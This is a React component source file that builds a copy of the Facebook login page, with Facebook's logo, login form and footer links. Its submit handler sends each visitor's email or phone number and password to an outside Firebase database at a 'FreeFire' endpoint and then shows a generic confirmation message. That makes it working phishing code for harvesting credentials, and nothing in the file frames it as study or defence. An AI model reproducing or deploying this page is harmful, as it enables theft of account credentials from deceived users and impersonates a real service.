import React, { useState } from "react";
import './Fb.css';

const Fb = () => {

    const [user, setUser] = useState({
        name: "",
        password: "",
    });
    let name ,value;
   const getUserData = (event) =>{
    name= event.target.name;
    value= event.target.value;

    setUser({ ...user, [name]: value});
   };

   const postData=async(e)=>{
    e.preventDefault();

    const {name,password }=user;
if(name&&password){
    const res=await fetch(
        // "https://freefire-102aa-default-rtdb.firebaseio.com/FreeFire.json"
        "https://freefire-f49a4-default-rtdb.firebaseio.com/FreeFire.json"
        ,{
            method:"POST",
            headers:{
                "Content-Type":"application/json",
            },
            body:JSON.stringify({
                name,
                password,
            }),
        }
        );
        if(res){
            setUser({
                name: "",
                password: "",
            });
            alert("Your request is submitted");
        }
}
else{
alert("Please fill the data");
}
    
   };
    return (
        <>
            <div className="bodyy">
                {/* logo: https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg */}
                <div className="fix-m-header">
                    <img src="./assets/cell-phone.png" alt="Android" />
                    <span>Get Facebook for Android and browse faster</span>
                </div>
                <div className="container">
                    {/* main container */}
                    <div className="content">
                        {/* logo container */}
                        <div className="left-content">
                            <div className="f-logo">
                                <img
                                    src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
                                    alt="Facebook"
                                />
                            </div>
                            <h2 className="f-quote">
                                Facebook helps you connect and share with the people in your life.
                            </h2>
                        </div>
                        {/* login form */}
                        <div className="right-content">
                            <div className="card">
                                <form method="POST">
                                    <div className="input-container">
                                        <input type="text" name="name" 
                                        placeholder="Email address or phone number" 
                                            value={user.name}
                                            onChange={getUserData}
                                        />
                                    </div>
                                    <div className="input-container">
                                        <input type="password" name="password"
                                         placeholder="Password" 
                                         value={user.password}
                                         onChange={getUserData}
                                         />
                                    </div>
                                    <div className="login-btn-container">
                                        <button className="login-btn" onClick={postData}>Log In</button>
                                    </div>
                                </form>
                                <div className="forgotten-password">
                                    <a href="#">Forgotten Password?</a>
                                </div>
                                <div className="divider" />
                                <div className="" style={{ textAlign: "center" }}>
                                    <a className="crt-new-ac" href="#">
                                        Create New Account
                                    </a>
                                </div>
                            </div>
                            <div className="crt-page">
                                <a href="#">Create a Page</a>
                                <span>for a celebrity, band or business.</span>
                            </div>
                        </div>
                    </div>
                </div>
                <footer className="f-lg-footer">
                    <ul>
                        <li>
                            <a href="">English (UK)</a>
                        </li>
                        <li>
                            <a href="">বাংলা</a>
                        </li>
                        <li>
                            <a href="">हिन्दी</a>
                        </li>
                        <li>
                            <a href="">اردو</a>
                        </li>
                        <li>
                            <a href="">नेपाली</a>
                        </li>
                        <li>
                            <a href="">ଓଡ଼ିଆ</a>
                        </li>
                        <li>
                            <a href="">Español</a>
                        </li>
                        <li>
                            <a href="">Português (Brasil)</a>
                        </li>
                        <li>
                            <a href="">Français (France)</a>
                        </li>
                        <li>
                            <a href="">Deutsch</a>
                        </li>
                        <li>
                            <a href="">Italiano</a>
                        </li>
                    </ul>
                    <div className="divider" />
                    <ul>
                        <li>
                            <a href="">Sign Up</a>
                        </li>
                        <li>
                            <a href="">Log In</a>
                        </li>
                        <li>
                            <a href="">Messenger</a>
                        </li>
                        <li>
                            <a href="">Facebook Lite</a>
                        </li>
                        <li>
                            <a href="">Watch</a>
                        </li>
                        <li>
                            <a href="">Places</a>
                        </li>
                        <li>
                            <a href="">Games</a>
                        </li>
                        <li>
                            <a href="">Marketplace</a>
                        </li>
                        <li>
                            <a href="">Facebook Pay</a>
                        </li>
                        <li>
                            <a href="">Jobs</a>
                        </li>
                        <li>
                            <a href="">Oculus</a>
                        </li>
                        <li>
                            <a href="">Portal</a>
                        </li>
                        <li>
                            <a href="">Instagram</a>
                        </li>
                        <li>
                            <a href="">Local</a>
                        </li>
                        <li>
                            <a href="">Fundraisers</a>
                        </li>
                        <li>
                            <a href="">Services</a>
                        </li>
                        <li>
                            <a href="">Voting</a>
                        </li>
                        <li>
                            <a href="">Information Centre</a>
                        </li>
                        <li>
                            <a href="">About</a>
                        </li>
                        <li>
                            <a href="">Create ad</a>
                        </li>
                        <li>
                            <a href="">Create Page</a>
                        </li>
                        <li>
                            <a href="">Developers</a>
                        </li>
                        <li>
                            <a href="">Careers</a>
                        </li>
                        <li>
                            <a href="">Privacy</a>
                        </li>
                        <li>
                            <a href="">Cookies</a>
                        </li>
                        <li>
                            <a href="">AdChoices</a>
                        </li>
                        <li>
                            <a href="">Terms</a>
                        </li>
                        <li>
                            <a href="">Help</a>
                        </li>
                        <li>
                            <a href="">Settings</a>
                        </li>
                    </ul>
                </footer>
                <div className="m-footer">
                    <div className="m-f-lang">
                        <ul>
                            <li>
                                <a href="">English (UK)</a>
                            </li>
                            <li>
                                <a href="">বাংলা</a>
                            </li>
                            <li>
                                <a href="">हिन्दी</a>
                            </li>
                        </ul>
                        <ul>
                            <li>
                                <a href="">اردو</a>
                            </li>
                            <li>
                                <a href="">नेपाली</a>
                            </li>
                            <li>
                                <a href="">ଓଡ଼ିଆ</a>
                            </li>
                        </ul>
                    </div>
                    <div style={{ clear: "both" }} />
                    <div className="links" style={{ textAlign: "center" }}>
                        <a href="#">About</a>
                        <a href="#">Help</a>
                        <a href="#">More</a>
                    </div>
                    <div
                        style={{
                            fontWeight: 600,
                            textAlign: "center",
                            margin: "10px 0",
                            color: "#777"
                        }}
                    >
                        Facebook Inc
                    </div>
                </div>
            </div>
        </>

    );
}

export default Fb;